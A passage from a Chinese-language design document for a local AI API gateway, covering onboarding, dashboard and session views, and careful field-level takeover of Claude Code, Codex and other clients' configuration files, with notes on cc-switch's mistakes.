| 3 | **L2 立即验 key**（§4.6） | 零成本。**这一步是整个引导的价值所在**——立刻告诉用户「通了」或者「key 不对」，而不是让他配完一堆东西再去发请求试 |
| 4 | **给出可复制的客户端配置** | 一段可直接粘贴的片段，加一个「帮我写进 `~/.claude/settings.json`」按钮（M3 之前手动，M3 之后走一键接管） |
| 5 | **等第一个请求，并高亮它** | 用户回到 Claude Code 敲一句话，我们的 Requests 页里那一行**跳出来**。这是「它真的在工作」的证明 |

第 5 步值得多花点力气。这类工具最难的一关是让用户相信「流量真的经过我了」——一个实时跳出来的请求行，比任何文案都有说服力。

**一条要如实说的脚注**：接管客户端配置之后，那个客户端需要重启一次才生效。§1 说的「不重启客户端」指的是**之后的所有切换**，不是接管本身。这一句要写在引导里，否则用户会以为哪里出错了。而且重启的必要性**按客户端分两类**（§7.11）——热重载的和必须重开终端的，提示语要说对。

#### 一个不明显的坑：两个新手引导会互相打架

cc-switch 有一个开关叫「跳过 Claude Code 初次安装确认」，它做的事是往 `~/.claude/settings.json` 里写一个跳过引导的字段。

**这个开关存在的唯一原因是**：改完配置之后，Claude Code 会以为自己是第一次运行，**弹出它自己的新手引导**，把刚做完接管的用户搞懵——他刚在我们这边点完「完成」，转头就看到另一个程序问他要不要开始设置。

我们会撞上同一件事。但**处理方式不同**：

cc-switch 的做法是替用户把那个字段写掉。我们不这么做，理由和 §7.11 的接管边界一致——**我们只改 endpoint 和 key，多写一个字段就是多一次越界**，而且那个字段和「让请求走我们」毫无关系。

我们的做法是**在接管完成那一屏加一句**：「Claude Code 可能会弹一次它自己的欢迎页面，点掉就行。」

**一句话的解释，胜过偷偷改一个用户没让你改的字段。** 这条判断在整份文档里会反复出现，因为它是这个产品和 cc-switch 最根本的分歧。

同期还要讲清楚观察态（§5.0）和隐私立场（§12），一句话带过，给关闭入口。不要做成必须逐页点「下一步」的向导。

### 7.7 Dashboard：第一屏必须回答两个问题

**「现在正常吗」和「今天花了多少」。** 这两个之外的东西，都不该出现在第一屏。

```
┌────────────────────────────────────────┐
│  ● 运行中          3 个活跃请求         │   ← 现在正常吗
│                                         │
│  今日  $3.42       较昨日同期  ↑ 12%    │   ← 今天花了多少
│                                         │
│  ⛨ 观察中 · 过去 7 天有 3 个请求把你的  │   ← 安全引导（§5.0）
│     API key 发给了 relay-cn   [查看]    │
└────────────────────────────────────────┘
        ↓ 往下滚才是曲线和明细
```

「较昨日同期」比孤立的 `$3.42` 有用得多：**一个数字只有在有参照时才能支持决策**。

第二屏放吞吐曲线、成本曲线、各 provider 的健康与延迟分位数。

**要避开仪表盘的通病：一堆孤立的数字卡片。** 十二个指标每个都「看起来重要」，但没有一个能让你做决定。

判据很简单：**每个元素都要能回答一个具体问题，答不上来就删掉。** 「缓存命中率 73%」能回答「我的缓存配得对不对」，留；「总请求数 1,247」回答不了任何问题，删。

**但这条判据有个容易误用的地方：「一切正常」也是一个答案。** 安全状态、运行状态这类东西的价值恰恰来自没有警报——它们必须常驻，因为**只在出事时才出现的指示器，是用户在最慌的时刻第一次见到的东西**（§5.0 展开说了）。判据问的是「能不能回答一个问题」，不是「有没有变化」。

### 7.8 Requests 页

虚拟化表格（TanStack Virtual），几万行不掉帧。列：

`时间 · 客户端 · 模型 · 命中规则 · Provider · 入tok · 出tok · 缓存 · TTFT · tok/s · 成本 · 状态`

点开右侧抽屉，四个标签页：

**Timeline** — DNS → TCP → TLS → 请求发出 → **首 token** → 完成，每段耗时。
Surge 有这个面板，但对 AI 来说 TTFT 才是体感的一切，值得放在最显眼的位置。一眼看出慢在网络还是慢在模型。

**Routing** — 命中的规则 → 策略组 → 策略决策 → 选中的 provider。
发生过故障转移就显示完整尝试链，包括每次失败的原因和耗时。

**Payload** — 完整的 request / response body。JSON 树视图 + 原始视图。
system prompt 默认折叠（Claude Code 的 system prompt 有几千 token，展开会淹没一切）。工具调用单独渲染成卡片，不要让人在 JSON 里找 `tool_use` block。

**Usage** — input / output / cache_read / cache_write 四项，各自单价与小计。估算值明确标记。

### 7.9 Sessions 页 —— 真正的差异化

Claude Code 的一次任务是几十到上百个请求，携带不断增长的上下文。孤立地看单个请求，看不出任何有用的东西。

按会话聚合，展示：

- 这个任务跑了多久、多少轮、总共花了多少钱
- **上下文增长曲线** —— 一眼看出哪次任务的上下文失控了
- 缓存命中率随轮次的变化 —— 看出哪一轮打断了缓存
- 每轮的成本瀑布 —— 找出那个 8 万 token 的文件读取

会话识别：system prompt 指纹 + 首条 user message 指纹 + 时间窗聚类。不完美，但对单机单用户场景足够。

**这是 cc-switch 和现有任何工具都没有的东西，也是最容易口口相传的功能。** 「我发现我一次重构花了 $4.7，其中 $3.1 是因为反复读同一个大文件」——这种洞察只有会话视图能给。

#### M4 实现下来的三条

**一、指纹为什么够用，理由要写清楚。** 一次对话里客户端每轮都把完整历史发上来，所以**开头那两段逐字不变**；而不同任务的开头几乎不会撞上。认不出来的时候返回「认不出来」——硬凑一个指纹会把互不相干的请求并成一个「会话」，那比没有会话视图更糟。

指纹只是指纹，不是会话 id。**「隔了多久」要看上一条是什么时候**，所以聚类那一步在 recorder 里，不在网关里。

**二、半小时的间隔是按「人」定的，不是按机器。** 中间去开个会再回来接着改，多半还是同一件事；隔了一夜再打开同一个仓库，通常不是。切错的代价是对称的（并多了或分多了），所以取一个人能理解的整数。

会话状态**只在内存**：core 重启之后，同一段对话会被算成新的一次任务。那不理想，但比把它持久化成第四份状态好——**会话是个观测概念，不是事实来源**。

**三、成本在会话这一层仍然是三态。** 「$1.23」和「$1.23，另有 4 轮没有价格」是两个不同的结论，所以聚合要单独报「没有价格的轮数」，一轮都没有价格时说「没有价格」而不是 `$0`。把没价格的当成 0 加进去，得到的是一个会撒谎的账（§4.3）。

本地应答的探测请求（§4.8）不算轮次——它们没经过上游，算进「这次任务跑了多少轮」会让每个数字都偏大一点，而偏得毫无规律。

### 7.10 配置类页面：表单和文本要能互相跳转

§3.8 定了双模式编辑，但没说界面怎么组织。

Providers、Groups、Routes 这几个页面是**表单**，另外有一个入口进 **Monaco 文本模式**。关键是两者的联动：

- 表单里选中一个 provider → 点「在配置文件里查看」→ Monaco 打开并**高亮那一段**
- Monaco 里光标停在某个 provider 上 → 侧边**显示对应的表单**

这个联动的价值不只是方便。它让用户建立一个正确的心智：**表单就是文件的另一种视图**，而不是两个割裂的东西。

而且它和 §3.8 的「最小文本替换」是配套的——用户能亲眼看到「我在表单里改一个字段，文件里只有那一行变了」。**这比任何文档都更能建立信任。**

> **两条都做了**（2026-09-11），顺带把编辑器换掉了。
>
> **正向**：表单里每个 provider 和策略组名字后面有个 `↗`，点了跳到文本
> 模式并把那一整段**选中** —— 不是只把光标放过去，用户按它是想确认
> 「这一段就是刚才表单里那个东西」，而一个看不见的光标回答不了这个。
>
> **反向**：光标停在哪儿，下面就说它是哪一段，还能一键跳回表单。
> **用解析器算，不用正则猜** —— `tw_yaml::path_at(text, offset)` 走的
> 是真正的节点树，返回段落加名字（不给下标：下标对界面没有意义，而且
> 用户重排之后它指向另一个东西）。猜错的表现是「我明明点在中转上，
> 右边显示的是官方」，那比没有这个功能更让人不信任这一页。
>
> **编辑器从 `textarea` 换成了 CodeMirror 6，不是 Monaco。** Monaco 是
> 整个 VS Code 的编辑器内核，5MB 起步，它的价值在 IntelliSense 和
> TypeScript 服务 —— 我们一样都用不上。这一页要的就三样：行号（配置
> 报错说的是「第 12 行」，而一个没有行号的框里数到第 12 行要用手指）、
> 语法高亮（缩进写错在高亮下一眼能看出来）、**精确的光标字节偏移**
> （反向联动要的就是它）。代价是前端从 297KB 涨到 617KB（gzip 87→194），
> 换 Monaco 的话是 5MB 起。
>
> 一个容易错的地方：**传给后端的是字节偏移，不是字符偏移。**中文配置下
> 两者差得很远，而后端是按字节切的（§9.7 里栽过好几次的那个坑）。

#### 配置类页面用同一套模式

五个配置页（Providers、Proxies、Groups、Routes、Clients）结构完全一样：

```
左侧列表（带状态点）  |  右侧详情 / 编辑表单
顶部：新建 · 搜索
每行：名字 · 状态 · 关键属性一两个
删除：要确认
```

**不要为每个页面发明不同的交互。** 用同一套模式，用户学一次就够，而且这五个页面加起来的开发量能压到很小——这正是 §7.2 说的投入倾斜。

状态点的含义各页不同但视觉一致：provider 是健康/熔断/禁用，proxy 是通/不通，client 是正常/过期（§3.3.1），route 是命中过/从没命中过（§6 的命中计数）。

### 7.11 Clients 页 —— 收编 cc-switch 的场景

扫描本机，列出检测到的 AI 客户端。**但要先分清两件不同的事**：

| | 接管 API 端点 | 管理 MCP 与 skill |
|---|---|---|
| 做什么 | 把流量引到我们的网关 | 集中管理工具配置和指令文件（§7.12） |
| 前提 | 客户端支持自定义 base URL | 客户端支持 MCP 或 skill |
| 例子 | Claude Code 可以，Claude Desktop 不行 | Claude Desktop 可以，Aider 不行 |

**两张表的成员不一样**，初稿把它们混成一张，漏掉了 Claude Desktop 这类「不走 API 端点但有 MCP 配置」的客户端。

#### 表一 · 能接管 API 端点的

字段名都对应上游当前文档，不是猜的：

| 客户端 | 配置位置 | 改哪个字段 | 一键接管 |
|---|---|---|---|
| **Claude Code** | `~/.claude/settings.json` | `env` 里的 `ANTHROPIC_BASE_URL` + `ANTHROPIC_AUTH_TOKEN` | ✅ |
| **Codex CLI** | `~/.codex/config.toml` | `model_provider` + `[model_providers.<id>]` 的 `base_url` | ✅ 有坑，见下 |
| **opencode** | `~/.config/opencode/opencode.json` | `provider.<id>.options.baseURL` | ✅ |
| **Gemini CLI** | `~/.gemini/` | `GOOGLE_GEMINI_BASE_URL` | ✅ |
| **Zed** | `~/.config/zed/settings.json` | `language_models.openai_compatible.<名字>.api_url` | ✅ |
| **Aider** | `.aider.conf.yml`（home → 仓库根 → cwd，后者覆盖前者） | `openai-api-base` | ✅ 注意它的三层查找顺序 |
| **Continue** | `~/.continue/config.yaml` | `apiBase` | ✅ |
| **Cline** | VS Code 扩展存储 | UI 里的 Base URL 字段 | ⚠️ 字段确认了，**持久化位置未查实** |
| **Cursor** | **没有配置文件** | 设置界面 → Models → Override OpenAI Base URL | ❌ 只能给指引 |

前五个在这台机器上实测存在。后四个是查证过字段但本机没装，实现时要各自验证一次。

**Cursor 那一行还有个额外限制**：即使手动改了，**Tab 补全和 inline edit 仍然走 Cursor 自己的后端**，不会经过我们。所以它显示为「部分接管」而不是「已接管」，避免用户以为所有流量都在我们这儿。

#### 表二 · 有 MCP 或 skill 要管的

| 客户端 | MCP 配置位置 | skill / 指令 |
|---|---|---|
| **Claude Code** | `~/.claude.json` 与项目级 `.mcp.json` | `~/.claude/skills/`、`.claude/commands/`、`.claude/agents/`、`CLAUDE.md` |
| **Claude Desktop** | `~/Library/Application Support/Claude/claude_desktop_config.json` | — |
| **Codex CLI** | `~/.codex/config.toml` 的 MCP 段 | `AGENTS.md` |
| **Cursor** | `~/.cursor/mcp.json` 与项目级 | `.cursorrules` |
| **opencode** | 配置里的 MCP 段 | 项目指令文件 |
| **Zed** | `settings.json` 的 context server 段 | — |

**Claude Desktop 只出现在这张表里**：它是订阅制客户端，不走自定义 API 端点，接管不了；但它有 MCP 配置，而且那是个**危险度很高的攻击面**（§5.3 把 MCP 排在第二）。漏掉它意味着扫描留了个洞。

#### Claude Code：两个认证头都得收

这是最关键的一条实现约束：

| 客户端设的变量 | 发出来的头 |
|---|---|
| `ANTHROPIC_AUTH_TOKEN` | `Authorization: Bearer <值>` |
| `ANTHROPIC_API_KEY` | `x-api-key: <值>` |
| `apiKeyHelper` | **两个都发** |

Gateway 必须同时接受这三种情况，否则用户手动配过 `ANTHROPIC_API_KEY` 就会撞 401。接管时我们统一写 `ANTHROPIC_AUTH_TOKEN`，理由是它会立刻覆盖已保存的 claude.ai 登录态；而 `ANTHROPIC_API_KEY` 在交互模式下需要用户在 `/config` 里点一次确认，**被拒绝的话是静默忽略的**，接管会看起来「没生效」却查不出原因。

另外两点：`env` 块的值**会覆盖真实 shell 环境变量**，所以接管不必去动用户的 `.zshrc`；但 `settings.local.json` 优先级更高，里面的残留 env 会遮蔽我们的写入，检测阶段必须一并扫描并提示（cc-switch 的 #6828 就是栽在这里）。

#### 接管是有代价的，必须提前告知

指向非官方 endpoint 会关掉客户端的一些能力，这些不是我们的 bug，但用户会算到我们头上：

- **Remote Control 和语音输入被禁用**，只要 `ANTHROPIC_BASE_URL` 不是官方域名。
- **MCP tool search 默认关闭**，需要额外设 `ENABLE_TOOL_SEARCH=true`。
- **网关模型发现默认关闭**，要设 `CLAUDE_CODE_ENABLE_GATEWAY_MODEL_DISCOVERY=1`，否则它根本不会来问我们的 `/v1/models`（§3.9）。接管时顺手写上。
- **`CLAUDE_CODE_MAX_OUTPUT_TOKENS` 对无法识别的模型名默认降到 32000。** 如果我们在 gateway 上暴露自定义模型名（比如 `sonnet-cheap`），输出会被悄悄砍掉。所以**默认透传原始模型名**，自定义名要走 `ANTHROPIC_CUSTOM_MODEL_OPTION` 并显式设置上限。

接管确认对话框要把这三条列出来，不能等用户自己发现。

#### Codex 的三个坑

**它不问我们要模型列表。** 实测对自定义 base_url 只发 `POST /v1/responses`，一个 GET 都没有。它的模型元数据来自本地的模型目录文件，配置里用 `model_catalog_json` 指过去。所以想让 Codex 看到定制的模型，**只能写那个文件**，HTTP 那条路对它无效（§3.9）。而且改完要重启 Codex，那个字段是启动时读的。

`wire_api` 现在**只接受 `"responses"`**，`"chat"` 已经被移除。另外 `openai` / `ollama` / `lmstudio` 是保留 id，我们的 provider id 不能用这几个。项目级的 `.codex/config.toml` 会**忽略** `model_provider`，只能写用户级。

##### M4 实现时的实测结果（codex-cli 0.139.0）

用一个本地嗅探器实跑了一遍，不是从文档抄的。四条结果都改变了实现：

| 试的是什么 | 结果 | 于是 |
|---|---|---|
| 不配任何密钥 | **照发请求，没有任何 `Authorization` 头** | **不写 `env_key`** —— 它指向一个没 export 的变量反而会让 Codex 起不来。本地网关不需要它 |
| `http_headers = { "X-ThinkWatch-Client" = "codex" }` | 原样送达 | 客户端识别用它，比密钥稳（字段名不带 `experimental_`） |
| `experimental_bearer_token = "x"` | 变成 `Authorization: Bearer x` | 网关要求鉴权时写它。**名字带 `experimental_`，上游可能改** —— 改了也只是丢掉鉴权，上面那个头仍然认得出是谁发的 |
| 请求路径 | 只有 `POST /v1/responses`，**一个 GET 都没有** | 证实了「它不问我们要模型列表」 |

另外两个副产品：

- 它自己就带 **`originator: codex_exec`** 头。这是个免费的客户端识别信号，不用我们写任何配置。
- 收到 5xx 时它**重试 5 次**。我们的网关返回 5xx 会被放大五倍，做限流和熔断时要记着这个系数。

`ModelProviderInfo` 的完整字段（从二进制里读出来的）：`name`、`base_url`、`env_key`、`env_key_instructions`、`experimental_bearer_token`、`query_params`、`http_headers`、`env_http_headers`、`request_max_retries`、`stream_max_retries`、`stream_idle_timeout_ms`、`websocket_connect_timeout_ms`、`requires_openai_auth`、`supports_websockets`、`wire_api`。

#### 一份关于 Claude Code 的更正

上面那张「两个认证头都得收」的表来自文档，网关同时接受三种情况这一点没变。但**「`ANTHROPIC_AUTH_TOKEN` 会立刻覆盖已保存的 claude.ai 登录态」这一句仍然是未验证的**。

M4 期间试过一次，观察到的是环境变量没有覆盖已保存的登录态 —— 但那次测试跑在一个 Claude Code 子进程里，父进程的环境可能有影响，**所以那次观察不构成反证，也不构成佐证**。这一条要在一个干净的会话里重测。

记在这里是为了防止下一个人从那次观察里得出一个错误的结论。

#### Cursor 接管不了，如实说

Cursor 没有可写的配置文件，只能在设置界面改。而且即使改了，**Tab 补全和 inline edit 仍然走 Cursor 自己的后端**，不会经过我们的网关。所以 Cursor 这一行显示为「手动配置」，给出复制按钮和一句说明，不假装能接管。

（这一条来自第三方文档和论坛，Cursor 官方文档站当时抓不到，标注为**未经厂商确认**。）

#### 「我明明配了，为什么没生效」

这是接管类工具最常见的支持问题，值得专门设计。cc-switch 为此做了一整套环境变量冲突检测（会去扫 shell 配置文件），说明这个坑足够常见。

原因有六种，而它们的排查难度差得很远：

| 原因 | 怎么发现 |
|---|---|
| **客户端没重启** | 比进程启动时间和我们写配置的时间 |
| `settings.local.json` 里有残留 | 静态扫描，它优先级比 `settings.json` 高 |
| 项目级配置覆盖了用户级 | 同上，要扫当前项目目录 |
| 管理策略文件覆盖了一切 | 同上，那是最高优先级 |
| shell 里 export 了同名变量 | 扫 rc 文件 |
| 我们写的字段被别的工具改回去了 | 读回来比对 |

**第一条最常见，而且判据便宜得离谱**：如果那个客户端的进程启动时间**早于**我们写配置的时间，它肯定还没读到新配置。一次 `sysinfo` 查询就能得出结论，不用猜。

#### 事后验证比事前检查更可靠

静态扫描能列出可疑项，但**它证明不了「接管真的生效了」**——优先级链有五层，任何一层出意外都可能让静态检查得出错误结论。

真正可靠的验证只有一个：**等一个真实请求过来**。

所以接管完成后进入一个「观察窗口」：

```
接管完成
   ↓
UI 上显示「已接管，等待第一个请求…」
   ↓
收到该客户端的请求  →  ✅ 确认生效，标记为「已验证」
   ↓
超过 5 分钟没收到    →  提示「还没收到请求」，给一个诊断按钮
```

这比接管完就宣布成功诚实得多——**我们改了一个文件，但那个文件有没有被读到，只有请求能证明**。

#### 但「五分钟」这个数字对一半客户端是错的

生效方式分成两类，而且差别很大：

| 客户端 | 生效方式 |
|---|---|
| Claude Code、Gemini CLI | **热重载**，下一个请求就走新配置 |
| Codex、OpenCode 等读环境变量的 | **必须关掉终端重开**，否则永远不生效 |

cc-switch 为此在文档里专门列了一张表——**说明这个差异真的会让用户困惑**。

对我们的直接后果是：**对需要重开终端的客户端，五分钟收不到请求是完全正常的**，用户可能一整天都没重开过终端。这时候弹「还没收到请求，是不是没生效？」是在制造焦虑，而且是狼来了——用户被误报几次之后，真正该看的那次也不会看了。

所以观察窗口要按客户端类型分叉：

- **热重载类**：五分钟没请求 → 提示 + 诊断入口。这是合理的怀疑。
- **需重启类**：接管完成的那一刻就明确告诉他「**Codex 需要关掉终端重开才生效**」，然后**不设超时提示**，安静等着。真的收到请求了才标「已验证」。

这条差异要在接管完成的那一屏就说清楚，而不是等五分钟后再说。

#### 诊断按钮跑完整的优先级链

点下去之后，按 Claude Code 真实的优先级顺序从高到低逐层检查（§7.11 的字段表），每层报告「有没有相关设置、值是什么、会不会盖住我们」。

输出要具体到能直接行动：

```
✗ ~/.claude/settings.local.json 里有 ANTHROPIC_BASE_URL
  它的优先级高于我们写的 settings.json，所以我们的配置不生效。

  [ 打开这个文件 ]  [ 帮我删掉这一行 ]
```

而不是笼统的「检测到配置冲突」。

#### 但不自动改用户的 shell 配置

cc-switch 会去修改 `.zshrc` 之类的文件，把冲突的 export 剥掉。**我们不这么做**，理由和 §3.3.1 不自动删过期条目一样：**那是用户的文件，我们没有写它的授权**。

要说句公道话：**他们不是鲁莽地删**——删之前会把完整的冲突列表备份成 JSON。这一点已经核实过了，它让「自动删除」这个决定看起来合理得多。

**但那个备份没有恢复入口。** 后端的恢复函数写完了、前端的调用封装也写好了，然后**整个界面里没有任何地方调用它**——没有备份列表页、没有还原按钮。用户删错了，只能自己去那个目录翻 JSON，再想办法手动触发。

这件事比它看起来更有意思：**一个团队在实现「危险操作」时，往往会认真写「备份」这一半，然后忘掉「恢复」那一半**——因为写代码时脑子里想的是「别把用户搞坏」，而不是「用户已经被搞坏了，现在怎么办」。**备份是给写代码的人安心用的，恢复才是给用户用的。**

同一份代码里还有第二个坑，更直接：**在 macOS 上删除「系统环境变量」类型的冲突是空操作**——运行中的应用改不了已经启动它的那个 shell 的环境，函数直接返回成功。但 **UI 照样提示「删除成功」**。用户点了、看到成功了、重开终端发现冲突还在。

这是一类特别值得记住的失败：**界面承诺 > 实际效果**。它比报错难查得多，因为一切看起来都对。

回到备份解决不了的那个问题。shell 配置的特殊之处在于**它往往不是一个孤立的文件**：可能被 dotfile 管理器管着（我们改完，下次同步会把改动带到用户所有机器上，或者被覆盖回去）、可能在 git 里（凭空多一个 dirty 状态）、可能有用户自己的注释和条件逻辑。**本地备份对这三种情况一个都没帮上。**

一个 AI 网关跑去改它，越的不是「数据安全」的界，是「这个文件归谁管」的界。

我们的做法是**报告 + 给一条可复制的命令**：

```
你的 ~/.zshrc 第 42 行导出了 ANTHROPIC_BASE_URL。
这不影响 Claude Code（它的 settings.json 优先级更高），
但会影响 Codex 和其他读环境变量的客户端。

  要移除的话：  sed -i '' '42d' ~/.zshrc
```

用户自己决定要不要执行。**报告是我们的职责，修改是他的权利。**

#### 写入必须是字段级合并

cc-switch 最集中的那批 issue 全是整体覆写造成的：#6902 把 23 个顶层键写剩 1 个，#6901 擦掉第三方 hooks，#6871 删掉 `enabledPlugins`。

我们的规则：

1. **只 patch 我们管的那几个字段**，其余原样保留。Codex 用 `toml_edit` 做外科式修改保住注释和格式，JSON 用保序解析。
2. **写入前全文备份**到 `~/.thinkwatch/backups/<时间戳>/`，UI 上展示 diff 让用户确认再落盘。备份要做成**一个统一的危险操作原语**，不是每个功能各自实现一遍——cc-switch 在三个互不相关的功能里各写了一次「操作前自动备份」，那说明三类事故都真实发生过，也说明散落实现最终一定会漏掉第四个地方。
3. **原子写但要认符号链接**——直接 rename 会把 dotfile 管理器的软链换成普通文件（cc-switch #6785）。检测到 symlink 就写穿到目标真实路径。
4. **加哨兵注释**标记哪些字段是我们写的，还原时只回滚这些。cc-switch 只按变量名匹配、不留标记，所以分不清哪些是用户自己配的。

#### 白名单的方向决定生死

cc-switch 后来真的做过一次「字段级合并」，代号 Partial Key-Field Merging。那是个 147 commits、改了 274 个文件的大版本。**两天后整个撤回了。**

撤回的理由值得逐字看：非白名单的自定义字段在切换时丢失、回填把非 key 字段从数据库里永久剥掉、白名单需要持续维护。

第一眼看这像是在说「别做字段级合并」。**不是。真正的问题是白名单指错了方向。**

| | 白名单里是什么 | 谁在往里加东西 | 结果 |
|---|---|---|---|
| **cc-switch** | 要**保留**的字段 | 上游 CLI（每次发版都可能加新字段） | 永远追不上，追不上就丢数据 |
| **我们** | 要**写入**的字段 | 我们自己（就 endpoint 和 key） | 有限、封闭、不会增长 |

同一个词，两种完全相反的东西。**白名单「保留什么」是在枚举一个你不控制、还在增长的集合——那注定失败**；白名单「写什么」枚举的是你自己的行为，天然是完备的。

所以规则一的措辞必须精确：**不是「把我们认识的字段合并进去」，而是「除了这几个字段，其余字节原样不动」**。前者是拷贝，后者是原地外科手术，`toml_edit` 和保序 JSON 解析就是为后者存在的。

配套的验证也从这里出来：**写完之后重新解析一遍，和「原文件 + 预期的那几处改动」做语义比对，对不上就拒绝落盘、保持原文件不动**。这比事后备份更前置——备份是出事之后的补救，这是不让它出事。

专属密钥的意义在于客户端识别，这样规则里才能写 `when: { client: claude-code }` 区分是谁发的请求。

**给用户看的那份 diff 里，密钥要打码。**字段摘要打码了还不够——**diff 是用户最可能截图去问「这样对吗」的那一屏**。打码只发生在送给界面的那一份，落盘写的仍然是真值。还原的 diff 里要打码的是**用户自己的原始密钥**，它比我们那把更不该出现在截图里。

这和 §9.7 那条「同一个程序，两个界面，两套标准」是同一件事：脱敏一旦漏掉一个出口，它在别处做得多仔细都不算数。

**接管的边界**：只改 endpoint 和 key 字段，绝不动其他设置。这是本项目唯一会写用户其他软件配置的地方，必须极度保守——用户敢按「接管」的前提是相信能退回去。


---

### 7.12 MCP 与 skill：看得见，然后能搬

cc-switch 有个多客户端同步 MCP 和 skill 的功能，思路是对的。但**单纯的同步只做对了一半**——问题的实质不是「配置散在多处很烦」，而是**你根本不知道自己装了什么**。五个客户端十几个 server，每一个都是能执行任意程序的入口（§5.3 把 MCP 排在攻击面第二位），却没有一个地方看得全。

所以顺序是：**先看得见，再谈搬动**。

#### 不做主清单，只做查看器

我上一版设计了一个「`config.yaml` 里的 `mcp:` 段作为主清单，各客户端是它的投影」。**那是错的，推翻掉。**

理由和 §3.1 一样：**各客户端的配置文件本来就是真相源**。引入主清单等于凭空造出第四份真相，然后要额外处理「主清单和客户端不一致时听谁的」——一个我们自己制造出来的问题。

正确的定位简单得多：

> **我们是一个查看器加复制工具。不声明任何状态，不维护任何清单。**

具体：

| | 做法 |
|---|---|
| 扫描 | **打开页面时扫一次，结果只在内存**。页面关了就没了 |
| 存储 | **零**。不进 `config.yaml`，不进 `data.db`，不写任何文件 |
| 同步 | 用户在矩阵上点一下，**执行一次复制**，然后重新扫描刷新视图 |

没有「同步状态」这个概念，也就没有「同步失效了」「主清单过期了」这类问题。你看到的永远是磁盘上此刻的真实情况。

#### 一张矩阵，点格子就是操作

```
                Claude Code   Cursor   Desktop   Codex
  github            ✓           ✓         ✓        ·
  filesystem        ✓           ·         ·        ·
  postgres          ✓           ·         ·        ✓
  ⚠ some-server     ·           ✓         ·        ·      ← 扫描有发现
```

- **空格子点一下** → 从某个已有它的客户端复制过来（多个来源时让用户选）
- **实心格子点一下** → 从这个客户端移除
- **整行操作** → 「同步到所有客户端」「从所有客户端移除」

移除那一项其实是应急开关的替代品：发现某个 server 有问题时，一次操作从所有客户端拿掉，不用去五个文件里各删一遍。比我上一版设计的 `enabled: false` 更直接——它真的删了，而不是留一个「禁用但还在配置里」的中间状态。

**同名不同配置**要显式处理：你在 Claude Code 里给 filesystem 的路径是 `~/Dev`，在 Cursor 里是 `~/Projects`。矩阵上这种情况标一个记号，点开并排 diff，复制时让用户选以哪边为准。

> **「点开并排 diff」补上了**（2026-09-11）。之前只标了记号 —— 而
> **标一个记号只回答了「不一样」，没回答「哪儿不一样」**，可用户要做
> 的决定恰恰是「以哪边为准」。
>
> 点 ⚠ 展开各客户端的版本并排列出，**只把真的不一样的字段高亮** ——
> 全都标一遍等于没标。环境变量仍然只显示名字不显示值（值里常常就是
> 密钥）。

#### 写入复用接管那套机制

往客户端配置文件里写东西，风险和 §7.11 的接管完全一样，所以规矩也一样：**字段级合并、写前全文备份、展示 diff 让用户确认、认符号链接、一键还原**。

这也是简化版能放进 M4 的原因——文件写入的难点在接管那边已经解决了，这里只是多几种目标格式。

#### 扫描逻辑和 §5.3 共用，但触发方式不同

| | §5.3 安全扫描 | §7.12 清单 |
|---|---|---|
| 触发 | 持续监听文件变更 | **打开页面时扫一次** |
| 目的 | 安全告警 | 展示和操作 |
| 结果去向 | 记进 `data.db`，要有历史 | **只在内存** |

同一套规则集，两个消费者。安全那边需要历史（「上周发现的问题」），管理这边不需要——你要的是此刻的真实状态。

#### M4 实现时从「能接管」里挪出去的两个

§7.11 表一里有两行在实现时降级成「只给指引」，理由都是**不假装能接管**：

| 客户端 | 为什么挪出去 |
|---|---|
| **Continue** | 接管它要往 `models:` 这个 YAML 列表里**插一个新条目**，那是结构性改写，不是替换一个标量。我们的 YAML 增量写入只做后者 |
| **Gemini CLI** | 它只读 `GOOGLE_GEMINI_BASE_URL` 环境变量，**没有可写的配置字段**。改 shell 配置超出了「只改 endpoint 和 key 字段」的边界（§7.11）——报告是我们的职责，修改是他的权利 |

**宁可少接管一个客户端，也不要写一段我们自己没把握的结构。**这些代码去改的是用户其他软件的配置，出错的代价不是「功能没做」而是「他的东西被弄坏了」。

Zed 是第三种情况：端点写得进去，但**密钥走它自己的凭据存储**，我们够不着。所以它是「部分接管」——写完之后要明说「密钥要你自己在 Zed 界面里填一次」。

#### skill 只看不搬

MCP 的配置是结构化的几行，各客户端格式不同但可以机械转换。**skill 不行**——它是一个目录（`SKILL.md` 加资源文件），而且**跨客户端的格式还没有事实标准**，目前只有 Claude Code 有成熟机制。

所以 skill 这边先做对一件事：**把散在各处的列全，扫一遍，告诉你哪个有问题**。§5.3 的隐藏字符检测在这里最有用——一个用了半年的 skill 突然多了一段零宽字符，只有集中看才发现得了。

搬动等格式收敛再说。

#### 简化版的边界

明确**不做**的：主清单、持续同步、`enabled` 状态、变更历史、skill 搬动。

这些不是「以后要补」的坑，而是**故意不要**——每一样都会引入一份需要维护的状态，而这个功能的价值恰恰在于它不维护任何状态。真需要声明式管理的那天再说，那时应该重新想，而不是把现在的东西加厚。

整块放 M4，跟客户端接管一起做。

---

### 7.13 空状态是首次体验的一部分

新装的应用打开，Requests 页是空的。**这时候显示「暂无数据」是浪费掉一次机会。**

应该显示引导，接上 §7.6 首次运行的最后两步：

```
        等待第一个请求…

   把这段配置复制到 Claude Code：
   ┌──────────────────────────────────┐
   │ ANTHROPIC_BASE_URL=http://…8788  │  [复制]
   │ ANTHROPIC_AUTH_TOKEN=tw-…        │
   └──────────────────────────────────┘
          [ 帮我写进 settings.json ]
```

第一个请求进来时，那一行要**跳出来**（短暂高亮），因为它是「它真的在工作」的证明。

其余页面的空状态同理：Providers 空了引导添加第一个上游，Sessions 空了说明「会话会在你用一段时间后出现」。**空状态永远在回答「接下来该做什么」。**

> **补齐了**（2026-09-11）。两处原来没做到：
>
> 1. **请求页的空状态没给出路。**它说了「把客户端指到 …:8788」，但对一个
>    不想自己改 `settings.json` 的人，那句话等于没说。加了一个「帮我写进
>    客户端配置」直接跳到 Clients 页。可复制的那段配置留在首次运行的
>    Connect 里，**不在这儿重复一遍** —— 概览里的网关密钥是打了码的，
>    为了这一处把真值也放出来不值得。
> 2. **第一个请求进来时没有跳出来。**原文说它是「它真的在工作」的证明，
>    而这类工具最难的一关正是让用户相信流量真的经过我们了。现在新出现
>    的行会绿一下（1.2 秒）。**开窗时把历史填进来的那一批不算** ——
>    那时满屏都在闪，反而看不出哪一条是新的。
>
> Clients 页一个客户端都没检测到时也补了空状态。

### 7.14 键盘

这类工具的高频用户会想用键盘：

| 键 | 动作 |
|---|---|
| `⌘K` | 命令面板：跳页面、搜请求、切策略组 |
| `↑` `↓` | 列表移动，`Enter` 展开抽屉 |
| `⌘F` | 搜当前列表 |
| `Esc` | 关抽屉 / 关面板 |

v1 做前两行就够，`⌘K` 那个可以晚点。但**列表的键盘导航要一开始就有**——Requests 是主战场，用鼠标一行行点太慢。

